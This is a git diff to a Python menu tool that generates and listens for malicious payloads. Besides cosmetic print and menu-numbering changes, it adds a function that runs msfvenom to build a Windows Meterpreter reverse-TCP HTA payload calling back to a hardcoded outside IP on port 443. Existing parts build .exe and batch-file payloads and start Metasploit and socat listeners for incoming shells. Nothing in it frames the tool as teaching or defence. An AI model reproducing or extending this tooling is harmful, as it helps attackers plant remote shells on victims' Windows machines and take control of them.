@@ -144,6 +144,7 @@ def clear_screen():
 
 def main_menu():
     print_centered("Main Menu")
+    print()
     print_shifted_left("[1] Make Exploit")
     print_shifted_left("[2] Listener For Exploits")
     print_shifted_left("[3] Exit")
@@ -171,10 +172,11 @@ def main_menu():
 
 def make_exploits_menu():
     print_centered("Make Exploits Menu")
+    print()
     print_shifted_left("[1] .EXE Exploit")
     print_shifted_left("[2] .BAT Exploits")
-    print_shifted_left("[2] .HTA Exploits")
-    print_shifted_left("[3] Go Back")
+    print_shifted_left("[3] .HTA Exploits")
+    print_shifted_left("[4] Go Back")
     print()
     print("Tip: Select an option by entering the corresponding number!")
     print()
@@ -185,15 +187,18 @@ def make_exploits_menu():
         clear_screen()
         print_fade_banner()
         make_exe_exploits()
-        make_exploits_menu()
+        main_menu()
     elif choice == '2':
         clear_screen()
         print_fade_banner()
         batch_file_menu()
-        files = os.listdir('.')
-        print(f"Files in Directory: {files}")
-        make_exploits_menu()
+        main_menu()
     elif choice == '3':
+        clear_screen()
+        print_fade_banner()
+        make_hta_exploits()
+        main_menu()
+    elif choice == '4':
         clear_screen()
         print_fade_banner()
         main_menu()
@@ -206,6 +211,7 @@ def make_exploits_menu():
 
 def listener_exploits_menu():
     print_centered("Listener Exploits Menu")
+    print()
     print_shifted_left("[1] Meterpreter Listener for .exe Exploits")
     print_shifted_left("[2] Socat Listener for .BAT Exploits")
     print_shifted_left("[3] Go Back")
@@ -236,6 +242,7 @@ def listener_exploits_menu():
 
 def batch_file_menu():
     print_centered("Batch File Creation Menu")
+    print()
     print_shifted_left("1. Use Predefined Commands")
     print_shifted_left("2. Enter Custom Commands")
     print_shifted_left("3. Go Back")
@@ -249,7 +256,7 @@ def batch_file_menu():
     elif choice == '3':
         main_menu()
     else:
-        print("Invalid option, try again.")
+        print_shifted_left("Invalid option, try again.")
         batch_file_menu()
 
 # ---------------------------------------listener menu options----------------------------------------
@@ -257,7 +264,7 @@ def batch_file_menu():
 def start_meterpreter_listener():
     try:
         # Run Metasploit commands via msfconsole with the provided options
-        print("Starting Meterpreter Listener:")
+        print_shifted_left("Starting Meterpreter Listener:")
         subprocess.run([
             "msfconsole", 
             "-x", 
@@ -268,14 +275,14 @@ def start_meterpreter_listener():
             "exploit -j"
         ], check=True)
     except subprocess.CalledProcessError as e:
-        print(f"Error running msfconsole: {e}")
+        print_shifted_left(f"Error running msfconsole: {e}")
     except FileNotFoundError:
-        print("msfconsole is not installed or not found in PATH. Please ensure Metasploit is installed.")
+        print_shifted_left("msfconsole is not installed or not found in PATH. Please ensure Metasploit is installed.")
 
 def start_Socat_listener():
     try:
         # Run Socat commands with the provided options
-        print("Starting Socat Listener")
+        print_shifted_left("Starting Socat Listener")
         subprocess.run([
             "socat", 
             "-d",
@@ -284,14 +291,17 @@ def start_Socat_listener():
             "STDOUT"
         ], check=True)
     except subprocess.CalledProcessError as e:
-        print(f"Error: {e}")
+        print_shifted_left(f"Error: {e}")
     except FileNotFoundError:
-        print("socat is not installed. Please install socat and try again.")
+        print_shifted_left("socat is not installed. Please install socat and try again.")
 
 # ---------------------------------------make exploits menu options----------------------------------------
 
 def make_exe_exploits():
     try:
+        print()
+        print_shifted_left("Please wait, Your payload is being generated......")
+        print()
         subprocess.run([
             "msfvenom", 
             "-p",
@@ -303,13 +313,15 @@ def make_exe_exploits():
             "-o",
             "exploit.exe"
         ], check=True)
-        print("Payload created successfully.")
+        print()
+        print_shifted_left("Payload created successfully.")
+        print()
     except subprocess.CalledProcessError as e:
-        print(f"Error occurred while creating the payload: {e}")
+        print_shifted_left(f"Error occurred while creating the payload: {e}")
     except FileNotFoundError:
-        print("msfvenom is not installed. Please install msfvenom and try again.")
+        print_shifted_left("msfvenom is not installed. Please install msfvenom and try again.")
     except Exception as e:
-        print(f"An unexpected error occurred: {e}")
+        print_shifted_left(f"An unexpected error occurred: {e}")
 
 predefined_bat_commands = {
     1: "@Echo off"
@@ -352,7 +364,7 @@ def show_predefined_commands():
 # Function to get commands from user
 def get_user_commands():
     commands = []
-    print("\nEnter the commands you want to add to the batch file.")
+    print("\nEnter the mod you want to add to the batch file.")
     
     while True:
         # Show predefined commands and prompt for user input
@@ -385,6 +397,32 @@ def create_batch_file_workflow(choice):
 
     create_batch_file(filename, commands)  # Create the batch file with the commands
     main_menu()  # Return to main menu
+
+def make_hta_exploits():
+    try:
+        print()
+        print_shifted_left("Please wait, Your payload is being generated......")
+        print()
+        subprocess.run([
+            'msfvenom', 
+            '-p', 
+            'windows/meterpreter/reverse_tcp', 
+            'LHOST=194.195.114.92', 
+            'LPORT=443', 
+            '-f', 
+            'hta-psh', 
+            '-o', 
+            'exploit.hta'
+            ], check=True)
+        print()
+        print_shifted_left("Payload created successfully.")
+        print()
+    except subprocess.CalledProcessError as e:
+        print_shifted_left(f"Error occurred while creating the payload: {e}")
+    except FileNotFoundError:
+        print_shifted_left("msfvenom is not installed. Please install msfvenom and try again.")
+    except Exception as e:
+        print_shifted_left(f"An unexpected error occurred: {e}")
 
 
 # ---------------------------------------Errors | Exit program----------------------------------------
